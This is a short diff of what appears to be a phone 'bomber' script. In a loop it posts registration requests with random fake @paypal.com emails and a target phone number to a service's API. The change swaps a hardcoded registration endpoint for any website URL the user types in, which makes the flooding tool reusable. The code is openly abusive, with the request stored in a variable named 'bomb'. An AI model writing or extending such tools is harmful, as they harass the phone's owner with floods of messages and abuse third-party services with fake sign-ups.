@@ -72,6 +72,7 @@ for i in range(int(nth)):
     print(s.status_code)
 
 z =requests.session()
+url2 =input("Enter the webiste")
 for i in range(int(nth)):
     email = ''.join(random.choice('0123456789ABCDEF') for i in range(7))+'@paypal.com'
     data = {
@@ -83,5 +84,5 @@ for i in range(int(nth)):
         "password_confirmation": "testtest",
         "phone": int(number)
     }
-    bomb = z.post("https://app.nettvnepal.com.np/api/v5/ntc/check/register",data=data)
+    bomb = z.post(url2,data=data)
     
